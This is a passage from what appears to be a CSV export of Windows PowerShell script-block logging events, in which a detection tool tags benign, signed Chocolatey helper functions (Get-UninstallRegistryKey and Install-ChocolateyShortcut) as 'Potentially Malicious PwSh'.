$keyPaths -ErrorAction Stop | ? { $_.DisplayName -like $softwareName } $success = $true } catch { Write-Debug ""Found bad key."" foreach ($key in $keys){ try { Get-ItemProperty $key.PsPath > $null } catch { $badKey = $key.PsPath } } Write-Verbose ""Skipping bad key: $badKey"" [array]$keys = $keys | ? { $badKey -NotContains $_.PsPath } } if ($success) { break; } if ($attempt -ge 10) { Write-Warning ""Found 10 or more bad registry keys. Run command again with `'--verbose --debug`' for more info."" Write-Debug ""Each key searched should correspond to an installed program. It is very unlikely to have more than a few programs with incorrectly encoded keys, if any at all. This may be indicative of one or more corrupted registry branches."" } } if ($foundKey -eq $null -or $foundkey.Count -eq 0) { Write-Warning ""No registry key found based on '$softwareName'"" } Write-Debug ""Found $($foundKey.Count) uninstall registry key(s) with SoftwareName:`'$SoftwareName`'""; return $foundKey } Set-Alias Get-InstallRegistryKey Get-UninstallRegistryKey # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBES8sHzbRLLNcJ # 9iSdROLrD1zFWyfa5gBGwaNn1wzd16CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPavSbp9dQ2siazYDp0Amg+EIr+hM9dp7a+0W # HNXStdkwDQYJKoZIhvcNAQEBBQAEggEASoaLXJSP8+kK99AO2/eLEtUgHMzrBxAl # 3VzBEO3yPsYgKkF2KgZc4+FheBMEUJmGnqnZXUzigSJFj2yuCX9drT9SLDxYlqLs # 7Ua4a7P+6qNOI+fv4RgzDpKhDIfLSyNtjfin2TUO6nnmCmKXBHHCGl6wT+3jXZZN # OrP0DRckft9wI+yARwZnsliyJJMJVyJ1HWiWQ1NBv1E8kxeHyiEvOKFWMU5Fxjcj # shLQenOBAQ0zgPgtO+1Mv7tVKPC/mPwz0XreiGzGdSz4BVdzNX8eqWTKAgBPj3Mq # bPOn+9cJalY+K0OXF0qjKx27oDqAJTgXt+XxHQVVUY1bwypkep6pZaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUnLpFbpv40cF+T1dB # 0ypaJ3jlTSowDQYJKoZIhvcNAQEBBQAEggEALrngzN2q5JHS+d5l8DxExXPtlQNA # JAKNBwqX67SWFfNfkxNZMFGuFchaQdB0k9VI0jWjfw79y4ZstY4f30i0ejf2v1MI # wjk6Hb02leUalNfkLJ15/LVbIj5GVbqc/ozZca6//w2OEt1UOBIEtM3ouv+WOnXk # yFTtR9F7HK8MLWRSnQf1BGYxHqcV9oUGVQUkIj81FVXz/O0ZH6fZ21ZFl17OJ/Yo # T4MurhlQWXSGtEaBioiyMD+EUOlEF41qxzxorydfgg3Y+UHLtOayryak/AVggpi/ # F8NPHe/rwVBbXO28fjwtMdy/eyXD9cV+07qiarT2sJI6LZWqo7ag34qtVw== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:49.380 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,86,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # 